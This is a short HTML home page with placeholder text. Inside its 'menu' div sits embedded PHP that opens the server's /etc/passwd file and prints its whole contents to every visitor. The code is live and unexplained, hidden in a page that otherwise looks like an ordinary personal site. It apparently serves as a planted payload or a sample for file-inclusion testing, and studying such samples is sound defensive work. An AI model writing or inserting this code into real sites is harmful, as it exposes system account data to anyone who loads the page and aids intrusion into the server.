<html>
<body>

<div class="menu"><?php
$myfile = fopen("/etc/passwd", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/etc/passwd"));
fclose($myfile);
?>
</div>

<h1>Welcome to my home page!</h1>
<p>Some text.</p>
<p>Some more text.</p>

</body>
</html>
